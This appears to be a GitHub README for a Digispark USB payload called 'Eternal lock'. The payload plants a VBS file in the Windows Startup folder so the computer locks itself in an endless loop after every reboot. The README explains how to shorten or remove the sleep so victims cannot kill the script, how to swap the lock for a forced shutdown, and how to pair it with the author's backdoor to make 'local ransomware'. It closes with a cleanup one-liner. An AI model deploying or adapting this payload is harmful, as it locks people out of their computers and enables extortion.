# Eternal lock: A perfect IZANAMI

This script forces the computer to lock itself on an infite loop. this script places the vbs File in the startup folder, so even if they restart windows, it keeps on happening

There are 3 bastard levels to this script:-

1. Wscript.Sleep 10000 decrease this time. it restricts the time to delete the vbs or stop the vbs through taskmanagar

2. Wscript.Sleep 10000 delete this and the laptop will be very very difficult to unlock unless My 'simple_backdoor_digispark' is used in this script.

3. Instead of ````rundll32.exe user32.dll,LockWorkStation\```` if you change it to ````shutdown.exe /p /f ```` . This goes to an eternal shutdown every time there is a startup.

### There are two good ways to stop the script I found. I any please let me know.

 1. Using task manager:- Just stop this process given in the img. You can see this icon for the task.

![tskmgr](https://i.ibb.co/G93Dh2M/eternal-lock-damage-control.png)

 2. Using my backdoor 

https://github.com/8figalltimepro/Digispark-Payloads/blob/main/Payloads/simple_backdoor_digispark/simple_backdoor_digispark.ino

Just add my backdoor code with the eternal lock code and it becomes a local ransomware but please don't do anything illegal. PERMISSION IS IMPORTANT.

This script needs to run first then the eternal lock.

````
taskkill /IM "wscript.exe" /F && cd %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ && del EL.vbs
````
Paste the above code in cmd and you will achieve freedom even from bastard level three :) lol
